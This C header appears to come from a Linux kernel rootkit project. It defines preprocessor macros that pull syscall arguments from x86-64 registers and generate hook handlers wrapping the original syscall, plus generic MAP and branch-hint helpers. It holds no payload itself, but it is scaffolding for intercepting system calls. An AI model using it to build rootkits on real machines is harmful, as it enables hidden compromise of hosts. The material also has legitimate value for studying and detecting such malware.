#ifndef _ROOTKIT_MACRO_UTILS_H_
#define _ROOTKIT_MACRO_UTILS_H_

#include "constants.h"
#include <asm/ptrace.h>
#include <linux/compiler.h>
#include <linux/linkage.h>
#include <linux/syscalls.h>

// MAP macros taken from https://github.com/swansontec/map-macro (public domain).
// Names changed to __MAPX[...] to avoid conflicts with other macros.

#define __MAPX_EVAL0(...) __VA_ARGS__
#define __MAPX_EVAL1(...) __MAPX_EVAL0(__MAPX_EVAL0(__MAPX_EVAL0(__VA_ARGS__)))
#define __MAPX_EVAL2(...) __MAPX_EVAL1(__MAPX_EVAL1(__MAPX_EVAL1(__VA_ARGS__)))
#define __MAPX_EVAL3(...) __MAPX_EVAL2(__MAPX_EVAL2(__MAPX_EVAL2(__VA_ARGS__)))
#define __MAPX_EVAL4(...) __MAPX_EVAL3(__MAPX_EVAL3(__MAPX_EVAL3(__VA_ARGS__)))
#define __MAPX_EVAL(...)  __MAPX_EVAL4(__MAPX_EVAL4(__MAPX_EVAL4(__VA_ARGS__)))

#define __MAPX_END(...)
#define __MAPX_OUT
#define __MAPX_COMMA ,

#define __MAPX_GET_END2()             0, __MAPX_END
#define __MAPX_GET_END1(...)          __MAPX_GET_END2
#define __MAPX_GET_END(...)           __MAPX_GET_END1
#define __MAPX_NEXT0(test, next, ...) next __MAPX_OUT
#define __MAPX_NEXT1(test, next)      __MAPX_NEXT0(test, next, 0)
#define __MAPX_NEXT(test, next)       __MAPX_NEXT1(__MAPX_GET_END test, next)

#define __MAPX0(f, x, peek, ...) f(x) __MAPX_NEXT(peek, __MAPX1)(f, peek, __VA_ARGS__)
#define __MAPX1(f, x, peek, ...) f(x) __MAPX_NEXT(peek, __MAPX0)(f, peek, __VA_ARGS__)

#define __MAPX_LIST_NEXT1(test, next) __MAPX_NEXT0(test, __MAPX_COMMA next, 0)
#define __MAPX_LIST_NEXT(test, next)  __MAPX_LIST_NEXT1(__MAPX_GET_END test, next)

#define __MAPX_LIST0(f, x, peek, ...) \
    f(x) __MAPX_LIST_NEXT(peek, __MAPX_LIST1)(f, peek, __VA_ARGS__)
#define __MAPX_LIST1(f, x, peek, ...) \
    f(x) __MAPX_LIST_NEXT(peek, __MAPX_LIST0)(f, peek, __VA_ARGS__)

/**
 * Applies the function macro `f` to each of the remaining arguments.
 */
#define __MAPX(f, ...) __MAPX_EVAL(__MAPX1(f, __VA_ARGS__, ()()(), ()()(), ()()(), 0))

/**
 * Applies the function macro `f` to each of the remaining arguments and
 * inserts commas between the results.
 */
#define __MAPX_LIST(f, ...) __MAPX_EVAL(__MAPX_LIST1(f, __VA_ARGS__, ()()(), ()()(), ()()(), 0))


// Macros for syscall hooking

#define __SC_DECL_CONST(t, a) t const a // Wrapper for `const` declaration

/**
 * Initializes a variable of the given name and type with the value from the given register.
 *
 * @param _reg_var  The register variable of type `struct pt_regs *`
 * @param _reg_name The register name
 * @param _var_type The variable type
 * @param _var_name The variable name
 */
#define __DECL_REG(_reg_var, _reg_name, _var_type, _var_name, ...) \
    _var_type const _var_name = ((_var_type)_reg_var->_reg_name)

#define __DECL_REG0(_reg_var)

#define __DECL_REG1(_reg_var, _var1_type, _var1_name) \
    __DECL_REG(_reg_var, di, _var1_type, _var1_name)

#define __DECL_REG2(_reg_var, _var1_type, _var1_name, _var2_type, _var2_name) \
    __DECL_REG1(_reg_var, _var1_type, _var1_name);                            \
    __DECL_REG(_reg_var, si, _var2_type, _var2_name)

#define __DECL_REG3(_reg_var, _var1_type, _var1_name, _var2_type, _var2_name, _var3_type, \
                    _var3_name)                                                           \
    __DECL_REG2(_reg_var, _var1_type, _var1_name, _var2_type, _var2_name);                \
    __DECL_REG(_reg_var, dx, _var3_type, _var3_name)

#define __DECL_REG4(_reg_var, _var1_type, _var1_name, _var2_type, _var2_name, _var3_type,          \
                    _var3_name, _var4_type, _var4_name)                                            \
    __DECL_REG3(_reg_var, _var1_type, _var1_name, _var2_type, _var2_name, _var3_type, _var3_name); \
    __DECL_REG(_reg_var, r10, _var4_type, _var4_name)

#define __DECL_REG5(_reg_var, _var1_type, _var1_name, _var2_type, _var2_name, _var3_type,         \
                    _var3_name, _var4_type, _var4_name, _var5_type, _var5_name)                   \
    __DECL_REG4(_reg_var, _var1_type, _var1_name, _var2_type, _var2_name, _var3_type, _var3_name, \
                _var4_type, _var4_name);                                                          \
    __DECL_REG(_reg_var, r8, _var5_type, _var5_name)

#define __DECL_REG6(_reg_var, _var1_type, _var1_name, _var2_type, _var2_name, _var3_type,         \
                    _var3_name, _var4_type, _var4_name, _var5_type, _var5_name, _var6_type,       \
                    _var6_name)                                                                   \
    __DECL_REG5(_reg_var, _var1_type, _var1_name, _var2_type, _var2_name, _var3_type, _var3_name, \
                _var4_type, _var4_name, _var5_type, _var5_name);                                  \
    __DECL_REG(_reg_var, r9, _var6_type, _var6_name)

/**
 * Initializes `x` variables of the given names and types with the values from the given registers.
 * The registers are respectively `di`, `si`, `dx`, `r10`, `r8`, and `r9`.
 *
 * @param x        The number of variables to initialize (0 <= `x` <= 6)
 * @param _reg_var The register variable of type `struct pt_regs *`
 * @param ...      The variable types and names
 */
#define __DECL_REGx(x, _reg_var, ...) __DECL_REG##x(_reg_var, __VA_ARGS__)

/**
 * Creates a syscall hook handler function for the given syscall with `x` parameters.
 *
 * @param x             The number of parameters (1 <= `x` <= 6)
 * @param _syscall_name The syscall name
 * @param _orig_sysfun  The local variable that will hold the original syscall function pointer
 * @param _reg_var      The local variable that will hold the `struct pt_regs *` reference
 * @param ...           The parameter types and names
 */
#define SYSCALL_HOOK_HANDLERx(x, _syscall_name, _orig_sysfun, _reg_var, ...)             \
    asmlinkage long __do_##_syscall_name##_hook(sysfun_t const _orig_sysfun,             \
                                                struct pt_regs *const _reg_var,          \
                                                __MAP(x, __SC_DECL_CONST, __VA_ARGS__)); \
    asmlinkage long HOOK_HANDLER_NAME(_syscall_name)(struct pt_regs *const _reg_var)     \
    {                                                                                    \
        __DECL_REGx(x, _reg_var, __VA_ARGS__);                                           \
        return __do_##_syscall_name##_hook(ORIG_SYSFUN(_syscall_name), _reg_var,         \
                                           __MAP(x, __SC_ARGS, __VA_ARGS__));            \
    }                                                                                    \
    asmlinkage long __do_##_syscall_name##_hook(sysfun_t const _orig_sysfun,             \
                                                struct pt_regs *const _reg_var,          \
                                                __MAP(x, __SC_DECL_CONST, __VA_ARGS__))

/**
 * Creates a syscall hook handler function for the given syscall with no parameters.
 *
 * @param _syscall_name The syscall name
 * @param _orig_sysfun  The local variable that will hold the original syscall function pointer
 * @param _reg_var      The local variable that will hold the `struct pt_regs *` reference
 */
#define SYSCALL_HOOK_HANDLER0(_syscall_name, _orig_sysfun, _reg_var)                 \
    asmlinkage long __do_##_syscall_name##_hook(sysfun_t const _orig_sysfun,         \
                                                struct pt_regs *const _reg_var);     \
    asmlinkage long HOOK_HANDLER_NAME(_syscall_name)(struct pt_regs *const _reg_var) \
    {                                                                                \
        return __do_##_syscall_name##_hook(ORIG_SYSFUN(_syscall_name), _reg_var);    \
    }                                                                                \
    asmlinkage long __do_##_syscall_name##_hook(sysfun_t const _orig_sysfun,         \
                                                struct pt_regs *const _reg_var)

/**
 * Creates a syscall hook handler function for the given syscall with 1 parameter.
 *
 * @param _syscall_name The syscall name
 * @param _orig_sysfun  The local variable that will hold the original syscall function pointer
 * @param _reg_var      The local variable that will hold the `struct pt_regs *` reference
 * @param ...           The parameter type and name
 */
#define SYSCALL_HOOK_HANDLER1(...) SYSCALL_HOOK_HANDLERx(1, __VA_ARGS__)

/**
 * Creates a syscall hook handler function for the given syscall with 2 parameters.
 *
 * @param _syscall_name The syscall name
 * @param _orig_sysfun  The local variable that will hold the original syscall function pointer
 * @param _reg_var      The local variable that will hold the `struct pt_regs *` reference
 * @param ...           The parameter types and names
 */
#define SYSCALL_HOOK_HANDLER2(...) SYSCALL_HOOK_HANDLERx(2, __VA_ARGS__)

/**
 * Creates a syscall hook handler function for the given syscall with 3 parameters.
 *
 * @param _syscall_name The syscall name
 * @param _orig_sysfun  The local variable that will hold the original syscall function pointer
 * @param _reg_var      The local variable that will hold the `struct pt_regs *` reference
 * @param ...           The parameter types and names
 */
#define SYSCALL_HOOK_HANDLER3(...) SYSCALL_HOOK_HANDLERx(3, __VA_ARGS__)

/**
 * Creates a syscall hook handler function for the given syscall with 4 parameters.
 *
 * @param _syscall_name The syscall name
 * @param _orig_sysfun  The local variable that will hold the original syscall function pointer
 * @param _reg_var      The local variable that will hold the `struct pt_regs *` reference
 * @param ...           The parameter types and names
 */
#define SYSCALL_HOOK_HANDLER4(...) SYSCALL_HOOK_HANDLERx(4, __VA_ARGS__)

/**
 * Creates a syscall hook handler function for the given syscall with 5 parameters.
 *
 * @param _syscall_name The syscall name
 * @param _orig_sysfun  The local variable that will hold the original syscall function pointer
 * @param _reg_var      The local variable that will hold the `struct pt_regs *` reference
 * @param ...           The parameter types and names
 */
#define SYSCALL_HOOK_HANDLER5(...) SYSCALL_HOOK_HANDLERx(5, __VA_ARGS__)

/**
 * Creates a syscall hook handler function for the given syscall with 6 parameters.
 *
 * @param _syscall_name The syscall name
 * @param _orig_sysfun  The local variable that will hold the original syscall function pointer
 * @param _reg_var      The local variable that will hold the `struct pt_regs *` reference
 * @param ...           The parameter types and names
 */
#define SYSCALL_HOOK_HANDLER6(...) SYSCALL_HOOK_HANDLERx(6, __VA_ARGS__)

/**
 * Declares a syscall hook handler function for the given syscall.
 * The function name is defined by the `HOOK_HANDLER_NAME` macro.
 *
 * @param _syscall_name The syscall name
 */
#define DECLARE_HOOK_HANDLER(_syscall_name) \
    asmlinkage long HOOK_HANDLER_NAME(_syscall_name)(struct pt_regs *const);

/**
 * Declares syscall hook handler functions for the given syscalls.
 * The function names are defined by the `HOOK_HANDLER_NAME` macro.
 *
 * @param ... The syscall names
 */
#define DECLARE_HOOK_HANDLERS(...) __MAPX(DECLARE_HOOK_HANDLER, __VA_ARGS__)

#define IF_U(cond) if (unlikely(cond)) /* Wrapper for `if` statement with *unlikely* condition */
#define IF_L(cond) if (likely(cond))   /* Wrapper for `if` statement with *likely* condition */

#endif
